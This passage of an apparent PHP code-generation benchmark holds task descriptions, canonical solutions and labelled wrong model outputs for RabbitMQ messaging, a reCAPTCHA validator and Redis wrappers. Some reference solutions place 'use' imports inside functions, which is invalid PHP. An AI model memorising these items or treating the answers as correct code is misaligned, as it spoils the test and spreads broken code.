$message->getRoutingKey(), ':', $message->getBody(), \"\\n\";\n        echo 'Message headers follows' . PHP_EOL;\n        var_dump($message->get('application_headers')->getNativeData());\n        echo PHP_EOL;\n    };\n\n    $channel->basic_consume($queueName, '', false, true, true, false, $callback);\n    while ($channel->is_consuming()) {\n        try {\n            $channel->wait(null, false, 2);\n        } catch (AMQPTimeoutException $exception) {\n        }\n        echo '*' . PHP_EOL;\n    }\n\n    $channel->close();\n    $connection->close();\n    return true;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 143,
    "wrong_result": "```php\nfunction consume_rabbitmq_messages($headers) {\n    if (empty($headers)) {\n        return false;\n    }\n\n    $connection = new AMQPConnection([\n        'host' => 'localhost',\n        'port' => 5672,\n        'vhost' => '/',\n        'login' => 'guest',\n        'password' => 'guest'\n    ]);\n\n    if (!$connection->connect()) {\n        fwrite(STDERR, \"Failed to connect to RabbitMQ server\\n\");\n        return false;\n    }\n\n    $channel = new AMQPChannel($connection);\n    $exchange = new AMQPExchange($channel);\n    $exchange->setName('headers_exchange');\n    $exchange->setType(AMQP_EX_TYPE_HEADERS);\n    $exchange->declareExchange();\n\n    $queue = new AMQPQueue($channel);\n    $queue->setName('');\n    $queue->declareQueue();\n\n    foreach ($headers as $header) {\n        list($key, $value) = explode('=', $header);\n        $queue->bind($exchange->getName(), '', [$key => $value]);\n    }\n\n    $queue->consume(function ($envelope, $queue) {\n        $msg = $envelope->getBody();\n        $headers = $envelope->getHeaders();\n        echo \"Received message: $msg\\n\";\n        echo \"Headers: \" . print_r($headers, true) . \"\\n\";\n    }, AMQP_AUTOACK);\n\n    $connection->disconnect();\n    return true;\n}\n```"
  },
  {
    "Task_id": 119,
    "Instruction": "Task Description: Create a function that sends multiple messages to a RabbitMQ queue using PHP and measures the execution time for the operation.\n\nFunction Description: The function establishes a connection to a RabbitMQ server, creates a temporary queue, sends a specified number of messages with the given content, and returns the total time taken to complete the operation. Each message is sent through a newly created channel, and the temporary queue is automatically deleted after use.\n\nInput:\n- $max_messages: [int] - The number of messages to send.\n- $host: [string] - The hostname or IP address of the RabbitMQ server.\n- $port: [int] - The port number of the RabbitMQ server.\n- $user: [string] - The username for RabbitMQ authentication.\n- $pass: [string] - The password for RabbitMQ authentication.\n- $vhost: [string] - The virtual host to connect to on the RabbitMQ server.\n- $message_body: [string] - The content of the message to be sent.\n\nOutput:\n- [float] - The total execution time in seconds for sending all messages, or false if the connection fails.",
    "Canonical_solution": "function send_rabbitmq_messages($max_messages, $host, $port, $user, $pass, $vhost, $message_body)\n{\n    use PhpAmqpLib\\Connection\\AMQPStreamConnection;\n    use PhpAmqpLib\\Message\\AMQPMessage;\n\n    $conn = new AMQPStreamConnection($host, $port, $user, $pass, $vhost);\n    if (!$conn) {\n        return false;\n    }\n\n    $time = microtime(true);\n\n    for ($i = 0; $i < $max_messages; $i++) {\n        $ch = $conn->channel();\n        list($queue,) = $ch->queue_declare('', false, false, true, true);\n        $msg = new AMQPMessage($message_body);\n        $ch->basic_publish($msg, '', $queue);\n        $ch->close();\n    }\n\n    $execution_time = microtime(true) - $time;\n    $conn->close();\n\n    return $execution_time;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 142,
    "wrong_result": "```php\nfunction send_messages($max_messages, $host, $port, $user, $pass, $vhost, $message_body) {\n    $start_time = microtime(true);\n    $connection = new AMQPConnection([\n        'host' => $host,\n        'port' => $port,\n        'vhost' => $vhost,\n        'login' => $user,\n        'password' => $pass\n    ]);\n    if (!$connection->connect()) {\n        return false;\n    }\n    $channel = new AMQPChannel($connection);\n    $queue = new AMQPQueue($channel);\n    $queue->declareQueue();\n    for ($i = 0; $i < $max_messages; $i++) {\n        $queue->publish($message_body, '', AMQP_NOPARAM, [\n            'delivery_mode' => AMQP_MSG_DELIVERY_MODE_PERSISTENT\n        ]);\n    }\n    $queue->delete();\n    $connection->disconnect();\n    $end_time = microtime(true);\n    return $end_time - $start_time;\n}\n```"
  },
  {
    "Task_id": 12,
    "Instruction": "Task Description: Implement a CAPTCHA validation class that verifies user-submitted CAPTCHA responses using Google's reCAPTCHA API.\n\nClass Description: The Captcha class implements Laravel's Rule interface to provide CAPTCHA validation functionality. It sends the user's CAPTCHA response to Google's verification endpoint and checks the success status in the response.\n\nAttributes: (This class has no explicit attributes as it uses configuration values directly)\n\nMethods:\n1: passes(string $attribute, mixed $value) -> bool - Validates the CAPTCHA response by sending it to Google's verification API along with the secret key and client IP. Returns true if verification succeeds.\n   - $attribute: The name of the attribute being validated\n   - $value: The CAPTCHA response token to be validated\n\n2: message() -> string - Returns the validation error message to be displayed when CAPTCHA validation fails. The message is localized using Laravel's translation system.",
    "Canonical_solution": "use GuzzleHttp\\Client;\n\nclass Captcha implements Rule\n{\n    public function passes($attribute, $value)\n    {\n        if (empty($value)) {\n            return false;\n        }\n\n        $response = json_decode((new Client([\n            'timeout' => config('boilerplate.access.captcha.configs.options.timeout'),\n        ]))->post('https://www.google.com/recaptcha/api/siteverify', [\n            'form_params' => [\n                'secret' => config('boilerplate.access.captcha.configs.secret_key'),\n                'remoteip' => request()->getClientIp(),\n                'response' => $value,\n            ],\n        ])->getBody(), true);\n\n        return isset($response['success']) && $response['success'] === true;\n    }\n\n    public function message()\n    {\n        return __('The captcha was invalid.');\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 133,
    "wrong_result": "```php\n<?php\n\nnamespace App\\Rules;\n\nuse Illuminate\\Contracts\\Validation\\Rule;\nuse Illuminate\\Support\\Facades\\Http;\n\nclass Captcha implements Rule\n{\n    /**\n     * Validate the CAPTCHA response.\n     *\n     * @param  string  $attribute\n     * @param  mixed  $value\n     * @return bool\n     */\n    public function passes($attribute, $value)\n    {\n        $response = Http::asForm()->post('https://www.google.com/recaptcha/api/siteverify', [\n            'secret' => config('captcha.secret_key'),\n            'response' => $value,\n            'remoteip' => request()->ip(),\n        ]);\n\n        return $response->json('success');\n    }\n\n    /**\n     * Get the validation error message.\n     *\n     * @return string\n     */\n    public function message()\n    {\n        return trans('validation.captcha');\n    }\n}\n?>\n```"
  },
  {
    "Task_id": 121,
    "Instruction": "Task Description: Create a function that sends a message to a RabbitMQ queue using PHP and the PhpAmqpLib library.\n\nFunction Description: The function establishes a connection to a RabbitMQ server, declares a queue and exchange, binds them, publishes a message with persistent delivery mode, and then closes the connection. It handles errors gracefully by returning false if an exception occurs.\n\nInput:  \n- $messageBody: [string] - The content of the message to be sent  \n- $exchange: [string] - The name of the exchange (default: 'router')  \n- $queue: [string] - The name of the queue (default: 'msgs')  \n\nOutput:  \n- [bool] - Returns true if the message was successfully sent, false if an error occurred",
    "Canonical_solution": "function send_rabbitmq_message($messageBody, $exchange = 'router', $queue = 'msgs')\n{\n    include(__DIR__ . '/config.php');\n    use PhpAmqpLib\\Connection\\AMQPStreamConnection;\n    use PhpAmqpLib\\Exchange\\AMQPExchangeType;\n    use PhpAmqpLib\\Message\\AMQPMessage;\n\n    try {\n        $connection = new AMQPStreamConnection(HOST, PORT, USER, PASS, VHOST);\n        $channel = $connection->channel();\n\n        $channel->queue_declare($queue, false, true, false, false);\n        $channel->exchange_declare($exchange, AMQPExchangeType::DIRECT, false, true, false);\n        $channel->queue_bind($queue, $exchange);\n\n        $message = new AMQPMessage($messageBody, array(\n            'content_type' => 'text/plain',\n            'delivery_mode' => AMQPMessage::DELIVERY_MODE_PERSISTENT\n        ));\n        \n        $channel->basic_publish($message, $exchange);\n        \n        $channel->close();\n        $connection->close();\n        \n        return true;\n    } catch (Exception $e) {\n        return false;\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 142,
    "wrong_result": "```php\nfunction sendToRabbitMQ($messageBody, $exchange = 'router', $queue = 'msgs') {\n    $connection = null;\n    $channel = null;\n    try {\n        $connection = new AMQPConnection([\n            'host' => 'localhost',\n            'port' => 5672,\n            'vhost' => '/',\n            'login' => 'guest',\n            'password' => 'guest'\n        ]);\n        $connection->connect();\n        $channel = new AMQPChannel($connection);\n        $exchangeObj = new AMQPExchange($channel);\n        $exchangeObj->setName($exchange);\n        $exchangeObj->setType(AMQP_EX_TYPE_DIRECT);\n        $exchangeObj->declareExchange();\n        $queueObj = new AMQPQueue($channel);\n        $queueObj->setName($queue);\n        $queueObj->declareQueue();\n        $queueObj->bind($exchange, $queue);\n        $exchangeObj->publish($messageBody, $queue, AMQP_MANDATORY | AMQP_DURABLE);\n        return true;\n    } catch (Exception $e) {\n        error_log($e->getMessage());\n        return false;\n    } finally {\n        if ($channel) {\n            $channel->close();\n        }\n        if ($connection) {\n            $connection->disconnect();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 122,
    "Instruction": "Task Description: Create a PHP function that publishes messages to a RabbitMQ queue in batches, measuring the total execution time for sending all messages.\n\nFunction Description: The function establishes a connection to a RabbitMQ server, declares an exchange and queue, then publishes a specified number of messages in configurable batch sizes. It handles connection blocking scenarios and returns the total execution time. A special 'quit' message is sent at the end to signal completion.\n\nInput:\n- $msg_count: [integer] - The total number of messages to publish\n- $batch_size: [integer] - The number of messages to send in each batch\n- $host: [string] - RabbitMQ server hostname\n- $port: [integer] - RabbitMQ server port\n- $user: [string] - RabbitMQ username\n- $pass: [string] - RabbitMQ password\n- $vhost: [string] - RabbitMQ virtual host\n\nOutput:\n- [float] - The total execution time in seconds for sending all messages",
    "Canonical_solution": "function publish_messages($msg_count, $batch_size, $host, $port, $user, $pass, $vhost)\n{\n    require_once __DIR__ . '/config.php';\n    use PhpAmqpLib\\Connection\\AMQPStreamConnection;\n    use PhpAmqpLib\\Exchange\\AMQPExchangeType;\n    use PhpAmqpLib\\Message\\AMQPMessage;\n    use PhpAmqpLib\\Exception\\AMQPConnectionBlockedException;\n\n    $exchange = 'bench_exchange';\n    $queue = 'bench_queue';\n\n    $connection = new AMQPStreamConnection($host, $port, $user, $pass, $vhost);\n    $channel = $connection->channel();\n\n    $channel->queue_declare($queue, false, false, false, false);\n    $channel->exchange_declare($exchange, AMQPExchangeType::DIRECT, false, false, false);\n    $channel->queue_bind($queue, $exchange);\n\n    $messageBody = <<<EOT\nabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyza\nEOT;\n\n    $message = new AMQPMessage($messageBody);\n    $time = microtime(true);\n\n    for ($i = 0; $i < $msg_count; $i++) {\n        $channel->batch_basic_publish($message, $exchange);\n\n        if ($i % $batch_size == 0) {\n            try {\n                $channel->publish_batch();\n            } catch (AMQPConnectionBlockedException $exception) {\n                do {\n                    sleep(10);\n                } while ($connection->isBlocked());\n                $channel->publish_batch();\n            }\n        }\n    }\n\n    $channel->publish_batch();\n    $channel->basic_publish(new AMQPMessage('quit'), $exchange);\n\n    $execution_time = microtime(true) - $time;\n    \n    $channel->close();\n    $connection->close();\n\n    return $execution_time;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 142,
    "wrong_result": "```php\nfunction publish_messages($msg_count, $batch_size, $host, $port, $user, $pass, $vhost) {\n    $start_time = microtime(true);\n    $connection = new AMQPConnection([\n        'host' => $host,\n        'port' => $port,\n        'vhost' => $vhost,\n        'login' => $user,\n        'password' => $pass,\n    ]);\n    $connection->connect();\n    $channel = new AMQPChannel($connection);\n    $exchange = new AMQPExchange($channel);\n    $exchange->setName('test_exchange');\n    $exchange->setType(AMQP_EX_TYPE_DIRECT);\n    $exchange->declareExchange();\n    $queue = new AMQPQueue($channel);\n    $queue->setName('test_queue');\n    $queue->declareQueue();\n    $queue->bind('test_exchange', 'test_routing_key');\n    for ($i = 0; $i < $msg_count; $i += $batch_size) {\n        $messages = [];\n        for ($j = 0; $j < $batch_size && $i + $j < $msg_count; $j++) {\n            $messages[] = 'Message ' . ($i + $j);\n        }\n        $exchange->publishBatch($messages, 'test_routing_key');\n    }\n    $exchange->publish('quit', 'test_routing_key');\n    $connection->disconnect();\n    return microtime(true) - $start_time;\n}\n```"
  },
  {
    "Task_id": 123,
    "Instruction": "Task Description: Implement a PHP function that sends a message to a RabbitMQ queue using the PhpAmqpLib library. The function should handle connection establishment, message publishing, and resource cleanup.\n\nFunction Description: The function `send_rabbitmq_message` sends a given message to a predefined RabbitMQ queue. It establishes a connection to the RabbitMQ server, declares the necessary exchange and queue, publishes the message, and then closes the connection. The function returns a boolean indicating success or failure.\n\nInput:  \n- `$message_content` (string): The content of the message to be sent to the RabbitMQ queue.\n\nOutput:  \n- (bool): Returns `true` if the message was successfully sent, `false` if an error occurred.",
    "Canonical_solution": "function send_rabbitmq_message($message_content)\n{\n    include(__DIR__ . '/config.php');\n    use PhpAmqpLib\\Connection\\AMQPStreamConnection;\n    use PhpAmqpLib\\Exchange\\AMQPExchangeType;\n    use PhpAmqpLib\\Message\\AMQPMessage;\n\n    $exchange = 'basic_get_test';\n    $queue = 'basic_get_queue';\n\n    try {\n        $connection = new AMQPStreamConnection(HOST, PORT, USER, PASS, VHOST);\n        $channel = $connection->channel();\n\n        $channel->queue_declare($queue, false, true, false, false);\n        $channel->exchange_declare($exchange, AMQPExchangeType::DIRECT, false, true, false);\n        $channel->queue_bind($queue, $exchange);\n\n        $message = new AMQPMessage($message_content, array('content_type' => 'text/plain', 'delivery_mode' => 2));\n        $channel->basic_publish($message, $exchange);\n\n        $channel->close();\n        $connection->close();\n\n        return true;\n    } catch (Exception $e) {\n        return false;\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 142,
    "wrong_result": "```php\nfunction send_rabbitmq_message($message_content) {\n    $connection = new AMQPConnection([\n        'host' => 'localhost',\n        'port' => 5672,\n        'vhost' => '/',\n        'login' => 'guest',\n        'password' => 'guest'\n    ]);\n\n    if (!$connection->connect()) {\n        return false;\n    }\n\n    $channel = new AMQPChannel($connection);\n    $exchange = new AMQPExchange($channel);\n    $exchange->setName('test_exchange');\n    $exchange->setType(AMQP_EX_TYPE_DIRECT);\n    $exchange->declareExchange();\n\n    $queue = new AMQPQueue($channel);\n    $queue->setName('test_queue');\n    $queue->declareQueue();\n\n    $queue->bind('test_exchange', 'test_routing_key');\n\n    $queue->publish($message_content, 'test_routing_key');\n\n    $connection->disconnect();\n\n    return true;\n}\n```"
  },
  {
    "Task_id": 125,
    "Instruction": "Task Description: Create a PHP class that provides a Redis-based queue management system with connection handling, basic Redis operations, and error recovery mechanisms.\n\nClass Description: The `queue` class is a Redis wrapper that manages connections to Redis servers and provides common Redis operations with automatic reconnection on failure. It supports multiple Redis connections, connection pooling, and prefixing of keys.\n\nAttributes:\n- `$redis`: [static, mixed] - Placeholder for Redis instance (deprecated in favor of `$links`)\n- `$configs`: [static, array] - Stores configuration for different Redis connections\n- `$links`: [static, array] - Maintains active Redis connections\n- `$link_name`: [static, string] - Current connection name (defaults to 'default')\n- `$prefix`: [static, string] - Default prefix for Redis keys\n- `$error`: [static, string] - Stores the last error message\n\nMethods:\n- `init()` -> [bool|Redis] - Initializes Redis connection using current configuration. Returns Redis instance or false on failure.\n- `set($key, $value, $expire = 0)` -> [bool|null] - Sets a key-value pair in Redis with optional expiration. Returns true on success, null on failure.\n- `get($key)` -> [mixed|null] - Retrieves a value by key from Redis. Returns the value or null on failure.\n- `del($key)` -> [int|null] - Deletes a key from Redis. Returns number of deleted keys or null on failure.\n- `_get_default_config()` -> [array] - Retrieves default Redis configuration from global settings.\n- `clear_link()` -> [void] - Closes all active Redis connections and clears the connection pool.\n\nInput:\n- Configuration via `$GLOBALS['config']['redis']` for default connection\n- Method parameters as described above\n\nOutput:\n- For connection methods: Redis instance or boolean\n- For data operations: Various return types as described above\n- Error messages stored in `$error` property",
    "Canonical_solution": "namespace phpspider\\core;\n\nuse Exception;\nuse Redis;\n\nclass queue\n{\n    protected static $redis = NULL;\n    protected static $configs = array();\n    private static $links = array();\n    private static $link_name = 'default';\n    public static $prefix = 'phpspider';\n    public static $error = '';\n\n    public static function init()\n    {\n        if (!extension_loaded('redis'))\n        {\n            self::$error = 'The redis extension was not found';\n            return false;\n        }\n\n        $config = self::$link_name == 'default' ? self::_get_default_config() : self::$configs[self::$link_name];\n\n        if (empty(self::$links[self::$link_name]))\n        {\n            self::$links[self::$link_name] = new Redis();\n            if (strstr($config['host'], '.sock'))\n            {\n                if (!self::$links[self::$link_name]->connect($config['host']))\n                {\n                    self::$error = 'Unable to connect to redis server';\n                    unset(self::$links[self::$link_name]);\n                    return false;\n                }\n            }\n            else\n            {\n                if (!self::$links[self::$link_name]->connect($config['host'], $config['port'], $config['timeout']))\n                {\n                    self::$error = 'Unable to connect to redis server';\n                    unset(self::$links[self::$link_name]);\n                    return false;\n                }\n            }\n\n            if ($config['pass'])\n            {\n                if (!self::$links[self::$link_name]->auth($config['pass']))\n                {\n                    self::$error = 'Redis Server authentication failed';\n                    unset(self::$links[self::$link_name]);\n                    return false;\n                }\n            }\n\n            $prefix = empty($config['prefix']) ? self::$prefix : $config['prefix'];\n            self::$links[self::$link_name]->setOption(Redis::OPT_PREFIX, $prefix.':');\n            self::$links[self::$link_name]->setOption(Redis::OPT_READ_TIMEOUT, -1);\n            self::$links[self::$link_name]->select($config['db']);\n        }\n\n        return self::$links[self::$link_name];\n    }\n\n    public static function set($key, $value, $expire = 0)\n    {\n        self::init();\n        try\n        {\n            if (self::$links[self::$link_name])\n            {\n                if ($expire > 0)\n                {\n                    return self::$links[self::$link_name]->setex($key, $expire, $value);\n                }\n                else\n                {\n                    return self::$links[self::$link_name]->set($key, $value);\n                }\n            }\n        }\n        catch (Exception $e)\n        {\n            $msg = \"PHP Fatal error:  Uncaught exception 'RedisException' with message '\".$e->getMessage().\"'\\n\";\n            log::warn($msg);\n            if ($e->getCode() == 0) \n            {\n                self::$links[self::$link_name]->close();\n                self::$links[self::$link_name] = null;\n                usleep(100000);\n                return self::set($key, $value, $expire);\n            }\n        }\n        return NULL;\n    }\n\n    public static function get($key)\n    {\n        self::init();\n        try\n        {\n            if (self::$links[self::$link_name])\n            {\n                return self::$links[self::$link_name]->get($key);\n            }\n        }\n        catch (Exception $e)\n        {\n            $msg = \"PHP Fatal error:  Uncaught exception 'RedisException' with message '\".$e->getMessage().\"'\\n\";\n            log::warn($msg);\n            if ($e->getCode() == 0) \n            {\n                self::$links[self::$link_name]->close();\n                self::$links[self::$link_name] = null;\n                usleep(100000);\n                return self::get($key);\n            }\n        }\n        return NULL;\n    }\n\n    public static function del($key)\n    {\n        self::init();\n        try\n        {\n            if (self::$links[self::$link_name])\n            {\n                return self::$links[self::$link_name]->del($key);\n            }\n        }\n        catch (Exception $e)\n        {\n            $msg = \"PHP Fatal error:  Uncaught exception 'RedisException' with message '\".$e->getMessage().\"'\\n\";\n            log::warn($msg);\n            if ($e->getCode() == 0) \n            {\n                self::$links[self::$link_name]->close();\n                self::$links[self::$link_name] = null;\n                usleep(100000);\n                return self::del($key);\n            }\n        }\n        return NULL;\n    }\n\n    protected static function _get_default_config()\n    {\n        if (empty(self::$configs['default']))\n        {\n            if (!is_array($GLOBALS['config']['redis']))\n            {\n                exit('cls_redis.php _get_default_config()' . '\u6ca1\u6709redis\u914d\u7f6e');\n            }\n            self::$configs['default'] = $GLOBALS['config']['redis'];\n        }\n        return self::$configs['default'];\n    }\n\n    public static function clear_link()\n    {\n        if(self::$links) \n        {\n            foreach(self::$links as $k=>$v)\n            {\n                $v->close();\n                unset(self::$links[$k]);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 144,
    "wrong_result": "```php\nclass queue {\n    public static $redis = null;\n    public static $configs = [];\n    public static $links = [];\n    public static $link_name = 'default';\n    public static $prefix = '';\n    public static $error = '';\n\n    public static function init() {\n        if (isset(self::$links[self::$link_name])) {\n            return self::$links[self::$link_name];\n        }\n        if (!isset(self::$configs[self::$link_name])) {\n            self::$configs[self::$link_name] = self::_get_default_config();\n        }\n        $redis = new Redis();\n        if ($redis->connect(self::$configs[self::$link_name]['host'], self::$configs[self::$link_name]['port'])) {\n            if (isset(self::$configs[self::$link_name]['password'])) {\n                $redis->auth(self::$configs[self::$link_name]['password']);\n            }\n            if (isset(self::$configs[self::$link_name]['database'])) {\n                $redis->select(self::$configs[self::$link_name]['database']);\n            }\n            self::$links[self::$link_name] = $redis;\n            return $redis;\n        }\n        self::$error = 'Failed to connect to Redis server';\n        return false;\n    }\n\n    public static function set($key, $value, $expire = 0) {\n        $redis = self::init();\n        if ($redis) {\n            $key = self::$prefix . $key;\n            if ($expire > 0) {\n                return $redis->setex($key, $expire, $value);\n            } else {\n                return $redis->set($key, $value);\n            }\n        }\n        return null;\n    }\n\n    public static function get($key) {\n        $redis = self::init();\n        if ($redis) {\n            return $redis->get(self::$prefix . $key);\n        }\n        return null;\n    }\n\n    public static function del($key) {\n        $redis = self::init();\n        if ($redis) {\n            return $redis->del(self::$prefix . $key);\n        }\n        return null;\n    }\n\n    private static function _get_default_config() {\n        return $GLOBALS['config']['redis'];\n    }\n\n    public static function clear_link() {\n        self::$links = [];\n    }\n}\n```"
  },
  {
    "Task_id": 127,
    "Instruction": "Task Description: Create a Redis wrapper class in PHP that provides a simplified interface for connecting to and interacting with a Redis server, including connection management, basic operations, and error handling.\n\nClass Description: The cls_redis class is a singleton-style wrapper for PHP's Redis extension that manages Redis connections, provides common Redis operations, and handles connection errors gracefully. It supports multiple connection configurations, automatic reconnection on failure, and key prefixing.\n\nAttributes:\n\nAttribute1: protected static $redis - Redis - Singleton Redis instance (deprecated)\nAttribute2: protected static $configs - array - Stores Redis connection configurations\nAttribute3: private static $links - array - Maintains active Redis connections\nAttribute4: private static $link_name - string - Current connection name (default 'default')\nAttribute5: public static $prefix - string - Default key prefix ('phpspider')\nAttribute6: public static $error - string - Stores last error message\n\nMethods:\n\nMethod1: init() -> Redis|false - Initializes and returns a Redis connection instance\nMethod2: set(string $key, mixed $value, int $expire = 0) -> bool|null - Stores a value in Redis with optional expiration\nMethod3: get(string $key) -> mixed|null - Retrieves a value from Redis by key\nMethod4: clear_link() -> void - Closes all active Redis connections\nMethod5: _get_default_config() -> array - Retrieves default Redis configuration from global settings",
    "Canonical_solution": "class cls_redis\n{\n    protected static $redis = NULL;\n    protected static $configs = array();\n    private static $links = array();\n    private static $link_name = 'default';\n    public static $prefix = \"phpspider\";\n    public static $error = \"\";\n\n    public static function init()\n    {\n        if (!extension_loaded(\"redis\"))\n        {\n            self::$error = \"The redis extension was not found\";\n            return false;\n        }\n\n        $config = self::$link_name == 'default' ? self::_get_default_config() : self::$configs[self::$link_name];\n\n        if (empty(self::$links[self::$link_name]))\n        {\n            self::$links[self::$link_name] = new Redis();\n            if (!self::$links[self::$link_name]->connect($config['host'], $config['port'], $config['timeout']))\n            {\n                self::$error = \"Unable to connect to redis server\\nPlease check the configuration file config/inc_config.php\";\n                unset(self::$links[self::$link_name]);\n                return false;\n            }\n\n            if ($config['pass'])\n            {\n                if (!self::$links[self::$link_name]->auth($config['pass'])) \n                {\n                    self::$error = \"Redis Server authentication failed\\nPlease check the configuration file config/inc_config.php\";\n                    unset(self::$links[self::$link_name]);\n                    return false;\n                }\n            }\n\n            $prefix = empty($config['prefix']) ? self::$prefix : $config['prefix'];\n            self::$links[self::$link_name]->setOption(Redis::OPT_PREFIX, $prefix . \":\");\n            self::$links[self::$link_name]->setOption(Redis::OPT_READ_TIMEOUT, -1);\n            self::$links[self::$link_name]->select($config['db']);\n        }\n\n        return self::$links[self::$link_name];\n    }\n\n    public static function set($key, $value, $expire = 0)\n    {\n        self::init();\n        try\n        {\n            if (self::$links[self::$link_name])\n            {\n                if ($expire > 0)\n                {\n                    return self::$links[self::$link_name]->setex($key, $expire, $value);\n                }\n                else\n                {\n                    return self::$links[self::$link_name]->set($key, $value);\n                }\n            }\n        }\n        catch (Exception $e)\n        {\n            $msg = \"PHP Fatal error: Uncaught exception 'RedisException' with message '\".$e->getMessage().\"'\\n\";\n            log::warn($msg);\n            if ($e->getCode() == 0) \n            {\n                self::$links[self::$link_name]->close();\n                self::$links[self::$link_name] = null;\n                usleep(100000);\n                return self::set($key, $value, $expire);\n            }\n        }\n        return NULL;\n    }\n\n    public static function get($key)\n    {\n        self::init();\n        try\n        {\n            if (self::$links[self::$link_name])\n            {\n                return self::$links[self::$link_name]->get($key);\n            }\n        }\n        catch (Exception $e)\n        {\n            $msg = \"PHP Fatal error: Uncaught exception 'RedisException' with message '\".$e->getMessage().\"'\\n\";\n            log::warn($msg);\n            if ($e->getCode() == 0) \n            {\n                self::$links[self::$link_name]->close();\n                self::$links[self::$link_name] = null;\n                usleep(100000);\n                return self::get($key);\n            }\n        }\n        return NULL;\n    }\n\n    public static function clear_link()\n    {\n        if(self::$links) \n        {\n            foreach(self::$links as $k=>$v)\n            {\n                $v->close();\n                unset(self::$links[$k]);\n            }\n        }\n    }\n\n    protected static function _get_default_config()\n    {\n        if (empty(self::$configs['default']))\n        {\n            if (!is_array($GLOBALS['config']['redis']))\n            {\n                exit('cls_redis.php _get_default_config()' . '\u6ca1\u6709redis\u914d\u7f6e');\n            }\n            self::$configs['default'] = $GLOBALS['config']['redis'];\n        }\n        return self::$configs['default'];\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 144,
    "wrong_result": "```php\n<?php\n\nclass cls_redis\n{\n    protected static $redis = null;\n    protected static $configs = [];\n    private static $links = [];\n    private static $link_name = 'default';\n    public static $prefix = 'phpspider';\n    public static $error = '';\n\n    public static function init()\n    {\n        if (self::$redis) {\n            return self::$redis;\n        }\n\n        if (!extension_loaded('redis')) {\n            self::$error = 'Redis extension is not loaded';\n            return false;\n        }\n\n        if (!isset(self::$configs[self::$link_name])) {\n            self::$configs[self::$link_name] = self::_get_default_config();\n        }\n\n        self::$links[self::$link_name] = new Redis();\n        $config = self::$configs[self::$link_name];\n\n        try {\n            if ($config['persistent']) {\n                self::$links[self::$link_name]->pconnect($config['host'], $config['port'], $config['timeout'], $config['persistent_id']);\n            } else {\n                self::$links[self::$link_name]->connect($config['host'], $config['port'], $config['timeout']);\n            }\n\n            if (isset($config['password'])) {\n                self::$links[self::$link_name]->auth($config['password']);\n            }\n\n            if (isset($config['database'])) {\n                self::$links[self::$link_name]->select($config['database']);\n            }\n\n            self::$redis = self::$links[self::$link_name];\n        } catch (RedisException $e) {\n            self::$error = $e->getMessage();\n            return false;\n        }\n\n        return self::$redis;\n    }\n\n    public static function set(string $key, mixed $value, int $expire = 0): bool|null\n    {\n        $redis = self::init();\n        if (!$redis) {\n            return null;\n        }\n\n        $key = self::$prefix . ':' . $key;\n        if ($expire > 0) {\n            return $redis->setex($key, $expire, $value);\n        } else {\n            return $redis->set($key, $value);\n        }\n    }\n\n    public static function get(string $key): mixed|null\n    {\n        $redis = self::init();\n        if (!$redis) {\n            return null;\n        }\n\n        $key = self::$prefix . ':' . $key;\n        return $redis->get($key);\n    }\n\n    public static function clear_link(): void\n    {\n        self::$links = [];\n        self::$redis = null;\n    }\n\n    private static function _get_default_config(): array\n    {\n        global $config;\n        return [\n            'host' => $config['redis']['host'],\n            'port' => $config['redis']['port'],\n            'timeout' => $config['redis']['timeout'],\n            'persistent' => $config['redis']['persistent'],\n            'persistent_id' => $config['redis']['persistent_id'],\n            'password' => $config['redis']['password'],\n            'database' => $config['redis']['database'],\n        ];\n    }\n}\n?>\n```"
  },
  {
    "Task_id": 128,
    "Instruction": "Task Description: Create a PHP class that implements a Redis client connection using TCP sockets and the phpiredis extension for efficient communication with a Redis server.\n\nClass Description: PhpiredisSocketConnection is a Redis client connection class that handles TCP socket communication with a Redis server. It manages socket creation, connection, data transmission, and response parsing using the phpiredis extension for optimal performance.\n\nAttributes:\n- reader: [resource] - The phpiredis reader resource used for parsing Redis protocol responses\n- parameters: [ParametersInterface] - Connection parameters including host, port, timeout, etc.\n\nMethods:\n- __construct(ParametersInterface $parameters) -> [void] - Initializes the connection and verifies required extensions\n- __destruct() -> [void] - Cleans up resources when the object is destroyed\n- assertExtensions() -> [void] - Verifies required PHP extensions are loaded\n- createReader() -> [resource] - Creates and configures a phpiredis reader resource\n- getStatusHandler() -> [callable] - Returns the handler for status responses\n- getErrorHandler() -> [callable] - Returns the handler for error responses\n- createResource() -> [resource] - Creates and connects the socket resource\n- connectWithTimeout(resource $socket, string $address, ParametersInterface $parameters) -> [void] - Establishes connection with timeout handling\n- write(string $buffer) -> [void] - Writes data to the socket connection\n- read() -> [mixed] - Reads and parses response from the server\n- 